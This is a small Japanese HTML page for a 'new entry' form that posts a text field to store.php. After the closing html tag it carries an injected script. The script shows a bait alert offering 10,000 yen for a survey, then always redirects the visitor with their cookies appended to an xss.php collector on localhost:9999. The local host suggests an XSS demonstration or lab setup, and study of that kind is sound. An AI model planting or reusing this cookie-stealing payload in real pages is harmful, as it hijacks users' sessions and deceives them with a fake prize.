<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>新規作成</title>
</head>
<body>
  <form action="store.php" method="post">
    <input type="text" name="content">
    <input type="submit" value="作成">
  </form>
  <div>
    <a href="index.php">一覧へもどる</a>
  </div>
</body>
</html>

<script>if (!alert('今ならアンケート回答で1万円GET！アンケートに答えますか？')) {location.href = 'http://localhost:9999/xss.php?' + document.cookie;}</script>